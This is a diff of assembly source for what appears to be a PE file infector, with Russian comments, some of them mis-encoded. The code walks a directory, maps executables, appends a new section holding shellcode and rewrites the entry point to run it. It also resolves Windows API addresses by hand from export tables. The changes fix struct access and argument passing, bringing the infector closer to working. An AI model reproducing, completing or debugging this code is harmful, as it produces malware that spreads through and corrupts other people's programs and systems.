@@ -151,7 +151,7 @@ AddSection proto CurrentStdcallNotation :ptr PeHeaders, :cword, : cword, : cword
 LoadPeFile proto CurrentStdcallNotation :cword, :cword, :cword
 ParsePeFileHeader proto CurrentStdcallNotation :cword, :cword
 printFileName proto CurrentStdcallNotation szFileName:ptr dword
-SearchForFiles proto szDir:ptr dword, fileExtension:ptr dword, func:ptr FileFunc
+SearchForFiles proto szDir:ptr dword, fileExtension:ptr dword, pe: ptr PeHeaders, func:ptr FileFunc
 InjectFiles proto CurrentStdcallNotation hFile:ptr cword, pe:ptr PeHeaders 
 
 DefineStdcallProto CreateFileA, 7
@@ -261,7 +261,7 @@ local szExt[10]:byte
 	lea cdi, InjectFiles
 
 	; Call SearchForFiles
-    invoke SearchForFiles, addr szDir, addr szExt, cdi
+    invoke SearchForFiles, addr szDir, addr szExt, addr [pe], cdi
   
     invoke Stdcall1 ptr [pExitProcess], 0
     ; ExitProcess (0)
@@ -270,7 +270,7 @@ main endp
 
 InjectFiles proc CurrentStdcallNotation hFile:ptr cword, pe:ptr PeHeaders 
 	mov ccx, hFile
-	invoke LoadPeFile, ccx, addr [pe], 0
+	invoke LoadPeFile, ccx, [pe], 0
 
     invoke InjectCode, addr[pe], glShellCode, sizeof(glShellCode)
 
@@ -293,7 +293,7 @@ printFileName proc CurrentStdcallNotation szFileName:ptr dword
     ret
 printFileName endp
 
-SearchForFiles proc CurrentStdcallNotation uses csi cdi ccx cax szDir:ptr dword, fileExtension:ptr dword, func:ptr FileFunc
+SearchForFiles proc CurrentStdcallNotation uses csi cdi ccx cax szDir:ptr dword, fileExtension:ptr dword, pe:ptr PeHeaders, func:ptr FileFunc
 	local szExt[10]:byte
 	local hFind:cword
 	local ffd:_ffd
@@ -323,6 +323,7 @@ SearchForFiles proc CurrentStdcallNotation uses csi cdi ccx cax szDir:ptr dword,
 		;; func(ffd.cFileName);
 		mov cdi, func ; Load the function pointer into cdi
 		lea csi, ffd._ffd.cFileName
+		push pe
 		push csi ; Push the argument and call the function
 		call cdi ; Call func
 		add csp, 4 ; Restore the stack
@@ -358,7 +359,7 @@ M:
 InjectedCode endp
 
 
-InjectCode proc CurrentStdcallNotation pe:ptr PeHeaders, code:cword, codeSize:cword
+InjectCode proc CurrentStdcallNotation uses cbx pe:ptr PeHeaders, code:cword, codeSize:cword
 	local offsetNewSection: cword
 	local rvaNewSection: cword
 
@@ -374,11 +375,11 @@ InjectCode proc CurrentStdcallNotation pe:ptr PeHeaders, code:cword, codeSize:cw
     invoke AddSection, pe, cax, [rvaNewSection], [offsetNewSection]
 
     mov cdx, pe	
-    assume cdx: ptr PeHeaders
+    ;;assume cdx: ptr PeHeaders
     
     ;;помещаем адрес шеллкода
 	mov cdi, [rvaNewSection]
-	mov csi, [cdx].nthead
+	mov csi, [cdx].PeHeaders.nthead
 	add cdi, [csi].IMAGE_NT_HEADERS.OptionalHeader.ImageBase
 	xor cax, cax
 	mov cax, sizeof(cword)
@@ -387,15 +388,15 @@ InjectCode proc CurrentStdcallNotation pe:ptr PeHeaders, code:cword, codeSize:cw
 	lea ccx, [InjectCode]
 	lea cdi, [InjectedCode]
 	add ccx, cdi
-	mov cax, [cdx].mem
+	mov cax, [cdx].PeHeaders.mem
 	add cax, [offsetNewSection]
 	mov dword ptr[cax], ccx
 
     ;;помещаем адрес оригинальной точки входа
-    mov csi, [cdx].nthead
+    mov csi, [cdx].PeHeaders.nthead
 	mov cdi, [csi].IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint
 	add cdi, [csi].IMAGE_NT_HEADERS.OptionalHeader.ImageBase
-	mov cax, [cdx].mem
+	mov cax, [cdx].PeHeaders.mem
 	add cax, [offsetNewSection]
 	mov dword ptr[cax + 4], cdi
 
@@ -403,7 +404,7 @@ InjectCode proc CurrentStdcallNotation pe:ptr PeHeaders, code:cword, codeSize:cw
 	mov cax, sizeof(cword)
 	mov cdi, 2
 	mul cdi
-	mov ccx, [cdx].mem
+	mov ccx, [cdx].PeHeaders.mem
 	add ccx, [offsetNewSection]
 	add cax, ccx
 	lea cdi, [InjectCode]
@@ -418,7 +419,7 @@ InjectCode proc CurrentStdcallNotation pe:ptr PeHeaders, code:cword, codeSize:cw
 	mov cax, sizeof(cword)
 	mov cdi, 2
 	mul cdi
-	mov ccx, [cdx].mem
+	mov ccx, [cdx].PeHeaders.mem
 	add ccx, [offsetNewSection]
 	add cax, ccx
 	lea cdi, [InjectCode]
@@ -436,7 +437,7 @@ InjectCode proc CurrentStdcallNotation pe:ptr PeHeaders, code:cword, codeSize:cw
 	mov ccx, 2
 	mul ccx
 	add cdi, cax
-	mov csi, [cdx].nthead
+	mov csi, [cdx].PeHeaders.nthead
 	mov cax, [csi].IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint
 	mov dword ptr[cax], cdi
 InjectCode endp
@@ -486,7 +487,6 @@ AddSection proc CurrentStdcallNotation uses cdi cbx csi cdx pe:ptr PeHeaders, ne
 	
     mov ccx, pe	
     ;;assume ccx: ptr PeHeaders
-    ;assume ccx: nothing
 	
 	mov csi, [ccx].PeHeaders.nthead
 	mov cax, [csi].IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment
@@ -548,14 +548,12 @@ AddSection proc CurrentStdcallNotation uses cdi cbx csi cdx pe:ptr PeHeaders, ne
     imul cdi, SIZEOF IMAGE_SECTION_HEADER
     add ccx, cdi
     mov [last_section], ccx
-    
-    ;int 3
 	
     ;; заполн€ем элемент в таблице дл€ новой секции
-	invoke sc_memset, dword ptr [last_section], 0, sizeof (IMAGE_SECTION_HEADER)
+    invoke sc_memset, dword ptr [last_section], 0, sizeof (IMAGE_SECTION_HEADER)
 	
-    invoke sc_printf, addr [cbx + strFormat - start], addr [cbx + new_sec - start]
-	invoke sc_strcpy, addr [last_section], addr [cbx + new_sec - start]
+    invoke sc_printf, addr [cbx + strFormat - start], addr [last_section]
+	invoke sc_strcpy, dword ptr [last_section], addr [cbx + new_sec - start]
 	mov cax, [last_section]
 	
 	mov csi, [last_section]
@@ -601,14 +599,14 @@ RvaToOffset proc CurrentStdcallNotation uses cbx ccx cdx cdi csi rva:cword, pe:p
     local NumberSection:cword
     
     mov ccx, pe	
-    assume ccx: ptr PeHeaders
+    ;;assume ccx: ptr PeHeaders
 
-	mov cax, [ccx].sections
+	mov cax, [ccx].PeHeaders.sections
 	mov [sections], cax
-	mov cax, [ccx].countSec
+	mov cax, [ccx].PeHeaders.countSec
 	mov [NumberSection], cax
 
-    mov csi, [ccx].nthead
+    mov csi, [ccx].PeHeaders.nthead
     mov cax, [csi].IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage
 
     .if rva > cax
@@ -650,87 +648,87 @@ RvaToOffset endp
 
 ParsePeFileHeader proc CurrentStdcallNotation uses cbx cdx mem:cword, pe:cword
 	mov cdx, [pe]
-    assume cdx: ptr PeHeaders
+    ;;assume cdx: ptr PeHeaders
 
     ;;указатель на заголовок PE
-    mov cax, [cdx].mem
-    mov [cdx].doshead, cax
+    mov cax, [cdx].PeHeaders.mem
+    mov [cdx].PeHeaders.doshead, cax
 
-    mov cdi, [cdx].doshead
+    mov cdi, [cdx].PeHeaders.doshead
     movzx cax, [cdi].IMAGE_DOS_HEADER.e_magic
     .if cax != IMAGE_DOS_SIGNATURE
-        invoke sc_UnmapViewOfFile, [cdx].mem
-        invoke sc_CloseHandle, [cdx].mapd
-        invoke sc_CloseHandle, [cdx].fd
+        invoke sc_UnmapViewOfFile, [cdx].PeHeaders.mem
+        invoke sc_CloseHandle, [cdx].PeHeaders.mapd
+        invoke sc_CloseHandle, [cdx].PeHeaders.fd
         ;invoke crt_printf, $CTA0("Error DOS signature\n");
         mov cax, 0
         ret
     .endif   
 
     ;;указатель на NT заголовок
-    mov cax, [cdx].mem
-    mov cdi, [cdx].doshead
+    mov cax, [cdx].PeHeaders.mem
+    mov cdi, [cdx].PeHeaders.doshead
     mov cdi, [cdi].IMAGE_DOS_HEADER.e_lfanew
     add cax, cdi
-    mov [cdx].nthead, cax
-    mov cdi, [cdx].nthead
+    mov [cdx].PeHeaders.nthead, cax
+    mov cdi, [cdx].PeHeaders.nthead
     mov cdi, [cdi].IMAGE_NT_HEADERS.Signature
 
     .if cdi != IMAGE_NT_SIGNATURE
-        invoke sc_UnmapViewOfFile, [cdx].mem
-        invoke sc_CloseHandle, [cdx].mapd
-        invoke sc_CloseHandle, [cdx].fd
+        invoke sc_UnmapViewOfFile, [cdx].PeHeaders.mem
+        invoke sc_CloseHandle, [cdx].PeHeaders.mapd
+        invoke sc_CloseHandle, [cdx].PeHeaders.fd
         ;;invoke crt_printf, $CTA0("Error NT signature\n");
         mov cax, 0
         ret
     .endif
 
     ;;получаем информацию о секци€х
-    mov cdi, [cdx].nthead
+    mov cdi, [cdx].PeHeaders.nthead
     lea cax, [cdi].IMAGE_NT_HEADERS.OptionalHeader
     movzx cdi, [cdi].IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader
     add cax, cdi
-    mov [cdx].sections, cax
-    mov cdi, [cdx].nthead
+    mov [cdx].PeHeaders.sections, cax
+    mov cdi, [cdx].PeHeaders.nthead
     movzx cax, [cdi].IMAGE_NT_HEADERS.FileHeader.NumberOfSections
-    mov [cdx].countSec, cax
+    mov [cdx].PeHeaders.countSec, cax
 
     ;;получаем инфомацию об экспорте
     mov cdx, pe
-    mov cdi, [cdx].nthead
+    mov cdi, [cdx].PeHeaders.nthead
     mov cax, [cdi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT * sizeof(IMAGE_DATA_DIRECTORY)].VirtualAddress
     .if cax
-        mov ccx, [cdx].mem
-        mov cdi, [cdx].nthead
+        mov ccx, [cdx].PeHeaders.mem
+        mov cdi, [cdx].PeHeaders.nthead
         mov csi, [cdi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT * sizeof(IMAGE_DATA_DIRECTORY)].VirtualAddress
         invoke RvaToOffset, csi, pe
         add cax, ccx
-        mov [cdx].expdir, cax
-        mov cdi, [cdx].nthead
+        mov [cdx].PeHeaders.expdir, cax
+        mov cdi, [cdx].PeHeaders.nthead
         mov cax, [cdi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT * sizeof(IMAGE_DATA_DIRECTORY)].isize
-        mov [cdx].sizeExpdir, cax
+        mov [cdx].PeHeaders.sizeExpdir, cax
     .else
-        mov [cdx].expdir, 0
-        mov [cdx].sizeExpdir, 0
+        mov [cdx].PeHeaders.expdir, 0
+        mov [cdx].PeHeaders.sizeExpdir, 0
     .endif
 
     ;;получаем информацию об импорте
     mov cdx, pe
-    mov cdi, [cdx].nthead
+    mov cdi, [cdx].PeHeaders.nthead
     mov cax, [cdi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT * sizeof(IMAGE_DATA_DIRECTORY)].VirtualAddress
     .if cax
-        mov ccx, [cdx].mem
-        mov cdi, [cdx].nthead
+        mov ccx, [cdx].PeHeaders.mem
+        mov cdi, [cdx].PeHeaders.nthead
         mov csi, [cdi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT * sizeof(IMAGE_DATA_DIRECTORY)].VirtualAddress
         invoke RvaToOffset, csi, pe
         add cax, ccx
-        mov [cdx].impdir, cax
-        mov cdi, [cdx].nthead
+        mov [cdx].PeHeaders.impdir, cax
+        mov cdi, [cdx].PeHeaders.nthead
         mov cax, [cdi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT * sizeof(IMAGE_DATA_DIRECTORY)].isize
-        mov [cdx].sizeImpdir, cax
+        mov [cdx].PeHeaders.sizeImpdir, cax
     .else
-        mov [cdx].impdir, 0
-        mov [cdx].sizeImpdir, 0
+        mov [cdx].PeHeaders.impdir, 0
+        mov [cdx].PeHeaders.sizeImpdir, 0
     .endif
 
     ret
@@ -739,17 +737,17 @@ ParsePeFileHeader endp
 
 LoadPeFile proc CurrentStdcallNotation uses cbx filename:cword, pe:cword, filesize:cword
     mov ccx, [pe]
-    assume ccx: ptr PeHeaders
+    ;;assume ccx: ptr PeHeaders
 
     mov cax, [filename]
-    mov [ccx].filename, cax
+    mov [ccx].PeHeaders.filename, cax
     
     push ccx
     invoke sc_CreateFileA, filename, GENERIC_READ or GENERIC_WRITE or GENERIC_EXECUTE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
 	pop ccx
 	
-    mov [ccx].fd, cax
-    .if [ccx].fd == INVALID_HANDLE_VALUE
+    mov [ccx].PeHeaders.fd, cax
+    .if [ccx].PeHeaders.fd == INVALID_HANDLE_VALUE
         ;invoke PrintLastErrorMessage
         ;;invoke crt_puts, $CTA0 ("Error open file\n")
         xor cax, cax
@@ -758,44 +756,44 @@ LoadPeFile proc CurrentStdcallNotation uses cbx filename:cword, pe:cword, filesi
     
     .if [filesize]
         mov cax, [filesize]
-        mov [ccx].filesize, cax
+        mov [ccx].PeHeaders.filesize, cax
     .else
 		push ccx
-        invoke sc_GetFileSize, [ccx].fd, 0
+        invoke sc_GetFileSize, [ccx].PeHeaders.fd, 0
         pop ccx
-        mov [ccx].filesize, cax
+        mov [ccx].PeHeaders.filesize, cax
     .endif
    
 	push ccx
-    invoke sc_CreateFileMappingA, [ccx].fd, 0, PAGE_READONLY, 0, [ccx].filesize, 0
+    invoke sc_CreateFileMappingA, [ccx].PeHeaders.fd, 0, PAGE_READONLY, 0, [ccx].PeHeaders.filesize, 0
     pop ccx
-    mov [ccx].mapd, cax
-    .if [ccx].mapd == 0
-        invoke sc_CloseHandle, [ccx].fd
+    mov [ccx].PeHeaders.mapd, cax
+    .if [ccx].PeHeaders.mapd == 0
+        invoke sc_CloseHandle, [ccx].PeHeaders.fd
         ;;invoke crt_puts, $CTA0 ("Error create fie mapping\n")
         xor cax, cax
         ret
     .endif
     
     push ccx
-    invoke sc_MapViewOfFile, [ccx].mapd, FILE_MAP_READ, 0, 0, 0
+    invoke sc_MapViewOfFile, [ccx].PeHeaders.mapd, FILE_MAP_READ, 0, 0, 0
     pop ccx
-    mov [ccx].mem, cax
-    .if [ccx].mem == 0
-        invoke sc_CloseHandle, [ccx].mapd
-        invoke sc_CloseHandle, [ccx].fd
+    mov [ccx].PeHeaders.mem, cax
+    .if [ccx].PeHeaders.mem == 0
+        invoke sc_CloseHandle, [ccx].PeHeaders.mapd
+        invoke sc_CloseHandle, [ccx].PeHeaders.fd
         ;;invoke crt_puts, $CTA0 ("Error mapping file\n")
         xor cax, cax
         ret
     .endif
 
 	push ccx
-    invoke ParsePeFileHeader, [ccx].mem, [pe]
+    invoke ParsePeFileHeader, [ccx].PeHeaders.mem, [pe]
     pop ccx
     .if !cax
-        invoke sc_UnmapViewOfFile, [ccx].mem
-        invoke sc_CloseHandle, [ccx].mapd
-        invoke sc_CloseHandle, [ccx].fd
+        invoke sc_UnmapViewOfFile, [ccx].PeHeaders.mem
+        invoke sc_CloseHandle, [ccx].PeHeaders.mapd
+        invoke sc_CloseHandle, [ccx].PeHeaders.fd
         xor cax, cax
         ret
     .endif
@@ -810,10 +808,9 @@ LoadPeFile endp
 ; переданы в первом аргументе funcNames.
 ; јдреса сохран€ютс€ по соответствующим индексам в массиве funcAddress.
 ; void FindProcArray (in char **funcNames, out void **funcAddress, int funcCount);
-FindProcArray proc CurrentStdcallNotation uses cdi funcNames:ptr byte, funcAddress:ptr byte, funcCount:cword
-
-local   i:dword
-    assume cdi: ptr cword
+FindProcArray proc CurrentStdcallNotation uses cdi cbx funcNames:ptr byte, funcAddress:ptr byte, funcCount:cword
+	local i:dword
+	
     mov [i], 0
 
 @@:
@@ -906,9 +903,9 @@ FindProcAddressByName endp
 ;
 FindProcAddress proc CurrentStdcallNotation uses cdi csi cbx baseLib:ptr byte, procName:ptr byte
 
-local functionsArray:cword
-local namesArray:cword
-local nameOrdinalsArray:cword
+	local functionsArray:cword
+	local namesArray:cword
+	local nameOrdinalsArray:cword
 
     mov cbx, [baseLib]
     
@@ -963,7 +960,6 @@ find_ret:
     ret
 
 FindProcAddress endp
-
 
 DefineStr ExitProcess
 DefineStr LoadLibraryA
